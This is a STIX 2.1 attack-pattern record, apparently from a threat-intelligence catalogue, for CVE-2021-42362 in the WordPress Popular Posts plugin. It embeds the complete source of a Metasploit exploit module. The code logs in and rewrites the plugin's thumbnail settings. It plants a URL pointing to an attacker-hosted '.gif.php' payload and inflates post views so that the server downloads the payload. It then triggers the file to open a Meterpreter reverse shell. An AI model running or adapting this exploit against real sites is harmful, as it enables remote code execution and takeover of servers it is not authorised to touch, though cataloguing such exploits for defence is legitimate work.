{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f09939ca-54ca-43b0-84be-7b7118249241",
    "created": "2024-08-14T17:10:58.315224Z",
    "modified": "2024-08-14T17:10:58.315228Z",
    "name": "Wordpress Popular Posts Authenticated RCE",
    "description": " This exploit requires Metasploit to have a FQDN and the ability to run a payload web server on port 80, 443, or 8080. The FQDN must also not resolve to a reserved address (192/172/127/10).  The server must also respond to a HEAD request for the payload, prior to getting a GET request. This exploit leverages an authenticated improper input validation in Wordpress plugin Popular Posts <= 5.3.2. The exploit chain is rather complicated.  Authentication is required and 'gd' for PHP is required on the server.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/wp_popular_posts_rce.rb",
            "external_id": "wp_popular_posts_rce.rb"
        },
        {
            "source_name": "reference",
            "url": "https://blog.nintechnet.com/improper-input-validation-fixed-in-wordpress-popular-posts-plugin/"
        },
        {
            "source_name": "WPVDB",
            "external_id": "bd4f157c-a3d7-4535-a587-0102ba4e3009"
        },
        {
            "source_name": "reference",
            "url": "https://plugins.trac.wordpress.org/changeset/2542638"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/cabrerahector/wordpress-popular-posts/commit/d9b274cf6812eb446e4103cb18f69897ec6fe601"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-42362"
        },
        {
            "source_name": "#thisURLvariesfromthePOConEDB",
            "external_id": "andismodeledafterwhatthebrowserdoes"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::FileDropper\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::HttpServer\n  include Msf::Exploit::Remote::HTTP::Wordpress\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Wordpress Popular Posts Authenticated RCE',\n        'Description' => %q{\n          This exploit requires Metasploit to have a FQDN and the ability to run a payload web server on port 80, 443, or 8080.\n          The FQDN must also not resolve to a reserved address (192/172/127/10).  The server must also respond to a HEAD request\n          for the payload, prior to getting a GET request.\n          This exploit leverages an authenticated improper input validation in Wordpress plugin Popular Posts <= 5.3.2.\n          The exploit chain is rather complicated.  Authentication is required and 'gd' for PHP is required on the server.\n          Then the Popular Post plugin is reconfigured to allow for an arbitrary URL for the post image in the widget.\n          A post is made, then requests are sent to the post to make it more popular than the previous #1 by 5. Once\n          the post hits the top 5, and after a 60sec (we wait 90) server cache refresh, the homepage widget is loaded\n          which triggers the plugin to download the payload from our server. Our payload has a 'GIF' header, and a\n          double extension ('.gif.php') allowing for arbitrary PHP code to be executed.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'h00die', # msf module\n          'Simone Cristofaro', # edb\n          'Jerome Bruandet' # original analysis\n        ],\n        'References' => [\n          [ 'EDB', '50129' ],\n          [ 'URL', 'https://blog.nintechnet.com/improper-input-validation-fixed-in-wordpress-popular-posts-plugin/' ],\n          [ 'WPVDB', 'bd4f157c-a3d7-4535-a587-0102ba4e3009' ],\n          [ 'URL', 'https://plugins.trac.wordpress.org/changeset/2542638' ],\n          [ 'URL', 'https://github.com/cabrerahector/wordpress-popular-posts/commit/d9b274cf6812eb446e4103cb18f69897ec6fe601' ],\n          [ 'CVE', '2021-42362' ]\n        ],\n        'Platform' => ['php'],\n        'Stance' => Msf::Exploit::Stance::Aggressive,\n        'Privileged' => false,\n        'Arch' => ARCH_PHP,\n        'Targets' => [\n          [ 'Automatic Target', {}]\n        ],\n        'DisclosureDate' => '2021-06-11',\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'PAYLOAD' => 'php/meterpreter/reverse_tcp',\n          'WfsDelay' => 3000 # 50 minutes, other visitors to the site may trigger\n        },\n        'Notes' => {\n          'Stability' => [ CRASH_SAFE ],\n          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS, CONFIG_CHANGES ],\n          'Reliability' => [ REPEATABLE_SESSION ]\n        }\n      )\n    )\n\n    register_options [\n      OptString.new('USERNAME', [true, 'Username of the account', 'admin']),\n      OptString.new('PASSWORD', [true, 'Password of the account', 'admin']),\n      OptString.new('TARGETURI', [true, 'The base path of the Wordpress server', '/']),\n      # https://github.com/WordPress/wordpress-develop/blob/5.8/src/wp-includes/http.php#L560\n      OptString.new('SRVHOSTNAME', [true, 'FQDN of the metasploit server. Must not resolve to a reserved address (192/10/127/172)', '']),\n      # https://github.com/WordPress/wordpress-develop/blob/5.8/src/wp-includes/http.php#L584\n      OptEnum.new('SRVPORT', [true, 'The local port to listen on.', 'login', ['80', '443', '8080']]),\n    ]\n  end\n\n  def check\n    return CheckCode::Safe('Wordpress not detected.') unless wordpress_and_online?\n\n    checkcode = check_plugin_version_from_readme('wordpress-popular-posts', '5.3.3')\n    if checkcode == CheckCode::Safe\n      print_error('Popular Posts not a vulnerable version')\n    end\n    return checkcode\n  end\n\n  def trigger_payload(on_disk_payload_name)\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path),\n      'keep_cookies' => true\n    )\n    # loop this 5 times just incase there is a time delay in writing the file by the server\n    (1..5).each do |i|\n      print_status(\"Triggering shell at: #{normalize_uri(target_uri.path, 'wp-content', 'uploads', 'wordpress-popular-posts', on_disk_payload_name)} in 10 seconds. Attempt #{i} of 5\")\n      Rex.sleep(10)\n      res = send_request_cgi(\n        'uri' => normalize_uri(target_uri.path, 'wp-content', 'uploads', 'wordpress-popular-posts', on_disk_payload_name),\n        'keep_cookies' => true\n      )\n    end\n    if res && res.code == 404\n      print_error('Failed to find payload, may not have uploaded correctly.')\n    end\n  end\n\n  def on_request_uri(cli, request, payload_name, post_id)\n    if request.method == 'HEAD'\n      print_good('Responding to initial HEAD request (passed check 1)')\n      # according to https://stackoverflow.com/questions/3854842/content-length-header-with-head-requests we should have a valid Content-Length\n      # however that seems to be calculated dynamically, as it is overwritten to 0 on this response. leaving here as notes.\n      # also didn't want to send the true payload in the body to make the size correct as that gives a higher chance of us getting caught\n      return send_response(cli, '', { 'Content-Type' => 'image/gif', 'Content-Length' => \"GIF#{payload.encoded}\".length.to_s })\n    end\n    if request.method == 'GET'\n      on_disk_payload_name = \"#{post_id}_#{payload_name}\"\n      register_file_for_cleanup(on_disk_payload_name)\n      print_good('Responding to GET request (passed check 2)')\n      send_response(cli, \"GIF#{payload.encoded}\", 'Content-Type' => 'image/gif')\n      close_client(cli) # for some odd reason we need to close the connection manually for PHP/WP to finish its functions\n      Rex.sleep(2) # wait for WP to finish all the checks it needs\n      trigger_payload(on_disk_payload_name)\n    end\n    print_status(\"Received unexpected #{request.method} request\")\n  end\n\n  def check_gd_installed(cookie)\n    vprint_status('Checking if gd is installed')\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'wp-admin', 'options-general.php'),\n      'method' => 'GET',\n      'cookie' => cookie,\n      'keep_cookies' => true,\n      'vars_get' => {\n        'page' => 'wordpress-popular-posts',\n        'tab' => 'debug'\n      }\n    )\n    fail_with(Failure::Unreachable, 'Site not responding') unless res\n    fail_with(Failure::UnexpectedReply, 'Failed to retrieve page') unless res.code == 200\n    res.body.include? ' gd'\n  end\n\n  def get_wpp_admin_token(cookie)\n    vprint_status('Retrieving wpp_admin token')\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'wp-admin', 'options-general.php'),\n      'method' => 'GET',\n      'cookie' => cookie,\n      'keep_cookies' => true,\n      'vars_get' => {\n        'page' => 'wordpress-popular-posts',\n        'tab' => 'tools'\n      }\n    )\n    fail_with(Failure::Unreachable, 'Site not responding') unless res\n    fail_with(Failure::UnexpectedReply, 'Failed to retrieve page') unless res.code == 200\n    /<input type=\"hidden\" id=\"wpp-admin-token\" name=\"wpp-admin-token\" value=\"([^\"]*)/ =~ res.body\n    Regexp.last_match(1)\n  end\n\n  def change_settings(cookie, token)\n    vprint_status('Updating popular posts settings for images')\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'wp-admin', 'options-general.php'),\n      'method' => 'POST',\n      'cookie' => cookie,\n      'keep_cookies' => true,\n      'vars_get' => {\n        'page' => 'wordpress-popular-posts',\n        'tab' => 'debug'\n      },\n      'vars_post' => {\n        'upload_thumb_src' => '',\n        'thumb_source' => 'custom_field',\n        'thumb_lazy_load' => 0,\n        'thumb_field' => 'wpp_thumbnail',\n        'thumb_field_resize' => 1,\n        'section' => 'thumb',\n        'wpp-admin-token' => token\n      }\n    )\n    fail_with(Failure::Unreachable, 'Site not responding') unless res\n    fail_with(Failure::UnexpectedReply, 'Failed to retrieve page') unless res.code == 200\n    fail_with(Failure::UnexpectedReply, 'Unable to save/change settings') unless /<strong>Settings saved/ =~ res.body\n  end\n\n  def clear_cache(cookie, token)\n    vprint_status('Clearing image cache')\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'wp-admin', 'options-general.php'),\n      'method' => 'POST',\n      'cookie' => cookie,\n      'keep_cookies' => true,\n      'vars_get' => {\n        'page' => 'wordpress-popular-posts',\n        'tab' => 'debug'\n      },\n      'vars_post' => {\n        'action' => 'wpp_clear_thumbnail',\n        'wpp-admin-token' => token\n      }\n    )\n    fail_with(Failure::Unreachable, 'Site not responding') unless res\n    fail_with(Failure::UnexpectedReply, 'Failed to retrieve page') unless res.code == 200\n  end\n\n  def enable_custom_fields(cookie, custom_nonce, post)\n    # this should enable the ajax_nonce, it will 302 us back to the referer page as well so we can get it.\n    res = send_request_cgi!(\n      'uri' => normalize_uri(target_uri.path, 'wp-admin', 'post.php'),\n      'cookie' => cookie,\n      'keep_cookies' => true,\n      'method' => 'POST',\n      'vars_post' => {\n        'toggle-custom-fields-nonce' => custom_nonce,\n        '_wp_http_referer' => \"#{normalize_uri(target_uri.path, 'wp-admin', 'post.php')}?post=#{post}&action=edit\",\n        'action' => 'toggle-custom-fields'\n      }\n    )\n    /name=\"_ajax_nonce-add-meta\" value=\"([^\"]*)/ =~ res.body\n    Regexp.last_match(1)\n  end\n\n  def create_post(cookie)\n    vprint_status('Creating new post')\n    # get post ID and nonces\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'wp-admin', 'post-new.php'),\n      'cookie' => cookie,\n      'keep_cookies' => true\n    )\n    fail_with(Failure::Unreachable, 'Site not responding') unless res\n    fail_with(Failure::UnexpectedReply, 'Failed to retrieve page') unless res.code == 200\n    /name=\"_ajax_nonce-add-meta\" value=\"(?<ajax_nonce>[^\"]*)/ =~ res.body\n    /wp.apiFetch.nonceMiddleware = wp.apiFetch.createNonceMiddleware\\( \"(?<wp_nonce>[^\"]*)/ =~ res.body\n    /},\"post\":{\"id\":(?<post_id>\\d*)/ =~ res.body\n    if ajax_nonce.nil?\n      print_error('missing ajax nonce field, attempting to re-enable. if this fails, you may need to change the interface to enable this.  See https://www.hostpapa.com/knowledgebase/add-custom-meta-boxes-wordpress-posts/. Or check (while writing a post) Options > Preferences > Panels > Additional > Custom Fields.')\n      /name=\"toggle-custom-fields-nonce\" value=\"(?<custom_nonce>[^\"]*)/ =~ res.body\n      ajax_nonce = enable_custom_fields(cookie, custom_nonce, post_id)\n    end\n    unless ajax_nonce.nil?\n      vprint_status(\"ajax nonce: #{ajax_nonce}\")\n    end\n    unless wp_nonce.nil?\n      vprint_status(\"wp nonce: #{wp_nonce}\")\n    end\n    unless post_id.nil?\n      vprint_status(\"Created Post: #{post_id}\")\n    end\n    fail_with(Failure::UnexpectedReply, 'Unable to retrieve nonces and/or new post id') unless ajax_nonce && wp_nonce && post_id\n\n    # publish new post\n    vprint_status(\"Writing content to Post: #{post_id}\")\n    # this is very different from the EDB POC, I kept getting 200 to the home page with their example, so this is based off what the UI submits\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'index.php'),\n      'method' => 'POST',\n      'cookie' => cookie,\n      'keep_cookies' => true,\n      'ctype' => 'application/json',\n      'accept' => 'application/json',\n      'vars_get' => {\n        '_locale' => 'user',\n        'rest_route' => normalize_uri(target_uri.path, 'wp', 'v2', 'posts', post_id)\n      },\n      'data' => {\n        'id' => post_id,\n        'title' => Rex::Text.rand_text_alphanumeric(20..30),\n        'content' => \"<!-- wp:paragraph -->\\n<p>#{Rex::Text.rand_text_alphanumeric(100..200)}</p>\\n<!-- /wp:paragraph -->\",\n        'status' => 'publish'\n      }.to_json,\n      'headers' => {\n        'X-WP-Nonce' => wp_nonce,\n        'X-HTTP-Method-Override' => 'PUT'\n      }\n    )\n\n    fail_with(Failure::Unreachable, 'Site not responding') unless res\n    fail_with(Failure::UnexpectedReply, 'Failed to retrieve page') unless res.code == 200\n    fail_with(Failure::UnexpectedReply, 'Post failed to publish') unless res.body.include? '\"status\":\"publish\"'\n    return post_id, ajax_nonce, wp_nonce\n  end\n\n  def add_meta(cookie, post_id, ajax_nonce, payload_name)\n    payload_url = \"http://#{datastore['SRVHOSTNAME']}:#{datastore['SRVPORT']}/#{payload_name}\"\n    vprint_status(\"Adding malicious metadata for redirect to #{payload_url}\")\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'wp-admin', 'admin-ajax.php'),\n      'method' => 'POST',\n      'cookie' => cookie,\n      'keep_cookies' => true,\n      'vars_post' => {\n        '_ajax_nonce' => 0,\n        'action' => 'add-meta',\n        'metakeyselect' => 'wpp_thumbnail',\n        'metakeyinput' => '',\n        'metavalue' => payload_url,\n        '_ajax_nonce-add-meta' => ajax_nonce,\n        'post_id' => post_id\n      }\n    )\n    fail_with(Failure::Unreachable, 'Site not responding') unless res\n    fail_with(Failure::UnexpectedReply, 'Failed to retrieve page') unless res.code == 200\n    fail_with(Failure::UnexpectedReply, 'Failed to update metadata') unless res.body.include? \"<tr id='meta-\"\n  end\n\n  def boost_post(cookie, post_id, wp_nonce, post_count)\n    # redirect as needed\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'index.php'),\n      'keep_cookies' => true,\n      'cookie' => cookie,\n      'vars_get' => { 'page_id' => post_id }\n    )\n    fail_with(Failure::Unreachable, 'Site not responding') unless res\n    fail_with(Failure::UnexpectedReply, 'Failed to retrieve page') unless res.code == 200 || res.code == 301\n    print_status(\"Sending #{post_count} views to #{res.headers['Location']}\")\n    location = res.headers['Location'].split('/')[3...-1].join('/') # http://example.com/<take this value>/<and anything after>\n    (1..post_count).each do |_c|\n      res = send_request_cgi!(\n        'uri' => \"/#{location}\",\n        'cookie' => cookie,\n        'keep_cookies' => true\n      )\n      # just send away, who cares about the response\n      fail_with(Failure::Unreachable, 'Site not responding') unless res\n      fail_with(Failure::UnexpectedReply, 'Failed to retrieve page') unless res.code == 200\n      res = send_request_cgi(\n        # this URL varies from the POC on EDB, and is modeled after what the browser does\n        'uri' => normalize_uri(target_uri.path, 'index.php'),\n        'vars_get' => {\n          'rest_route' => normalize_uri('wordpress-popular-posts', 'v1', 'popular-posts')\n        },\n        'keep_cookies' => true,\n        'method' => 'POST',\n        'cookie' => cookie,\n        'vars_post' => {\n          '_wpnonce' => wp_nonce,\n          'wpp_id' => post_id,\n          'sampling' => 0,\n          'sampling_rate' => 100\n        }\n      )\n      fail_with(Failure::Unreachable, 'Site not responding') unless res\n      fail_with(Failure::UnexpectedReply, 'Failed to retrieve page') unless res.code == 201\n    end\n    fail_with(Failure::Unreachable, 'Site not responding') unless res\n  end\n\n  def get_top_posts\n    print_status('Determining post with most views')\n    res = get_widget\n    />(?<views>\\d+) views</ =~ res.body\n    views = views.to_i\n    print_status(\"Top Views: #{views}\")\n    views += 5 # make us the top post\n    unless datastore['VISTS'].nil?\n      print_status(\"Overriding post count due to VISITS being set, from #{views} to #{datastore['VISITS']}\")\n      views = datastore['VISITS']\n    end\n    views\n  end\n\n  def get_widget\n    # load home page to grab the widget ID. At times we seem to hit the widget when it's refreshing and it doesn't respond\n    # which then would kill the exploit, so in this case we just keep trying.\n    (1..10).each do |_|\n      @res = send_request_cgi(\n        'uri' => normalize_uri(target_uri.path),\n        'keep_cookies' => true\n      )\n      break unless @res.nil?\n    end\n    fail_with(Failure::UnexpectedReply, 'Failed to retrieve page') unless @res.code == 200\n    /data-widget-id=\"wpp-(?<widget_id>\\d+)/ =~ @res.body\n    # load the widget directly\n    (1..10).each do |_|\n      @res = send_request_cgi(\n        'uri' => normalize_uri(target_uri.path, 'index.php', 'wp-json', 'wordpress-popular-posts', 'v1', 'popular-posts', 'widget', widget_id),\n        'keep_cookies' => true,\n        'vars_get' => {\n          'is_single' => 0\n        }\n      )\n      break unless @res.nil?\n    end\n    fail_with(Failure::UnexpectedReply, 'Failed to retrieve page') unless @res.code == 200\n    @res\n  end\n\n  def exploit\n    fail_with(Failure::BadConfig, 'SRVHOST must be set to an IP address (0.0.0.0 is invalid) for exploitation to be successful') if datastore['SRVHOST'] == '0.0.0.0'\n    cookie = wordpress_login(datastore['USERNAME'], datastore['PASSWORD'])\n\n    if cookie.nil?\n      vprint_error('Invalid login, check credentials')\n      return\n    end\n\n    payload_name = \"#{Rex::Text.rand_text_alphanumeric(5..8)}.gif.php\"\n    vprint_status(\"Payload file name: #{payload_name}\")\n\n    fail_with(Failure::NotVulnerable, 'gd is not installed on server, uexploitable') unless check_gd_installed(cookie)\n    post_count = get_top_posts\n\n    # we dont need to pass the cookie anymore since its now saved into http client\n    token = get_wpp_admin_token(cookie)\n    vprint_status(\"wpp_admin_token: #{token}\")\n    change_settings(cookie, token)\n    clear_cache(cookie, token)\n    post_id, ajax_nonce, wp_nonce = create_post(cookie)\n    print_status('Starting web server to handle request for image payload')\n    start_service({\n      'Uri' => {\n        'Proc' => proc { |cli, req| on_request_uri(cli, req, payload_name, post_id) },\n        'Path' => \"/#{payload_name}\"\n      }\n    })\n\n    add_meta(cookie, post_id, ajax_nonce, payload_name)\n    boost_post(cookie, post_id, wp_nonce, post_count)\n    print_status('Waiting 90sec for cache refresh by server')\n    Rex.sleep(90)\n    print_status('Attempting to force loading of shell by visiting to homepage and loading the widget')\n    res = get_widget\n    print_good('We made it to the top!') if res.body.include? payload_name\n    # if res.body.include? datastore['SRVHOSTNAME']\n    #  fail_with(Failure::UnexpectedReply, \"Found #{datastore['SRVHOSTNAME']} in page content. Payload likely wasn't copied to the server.\")\n    # end\n    # at this point, we rely on our web server getting requests to make the rest happen\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2021-06-11",
    "x_mitre_platforms": [
        "['php']"
    ]
}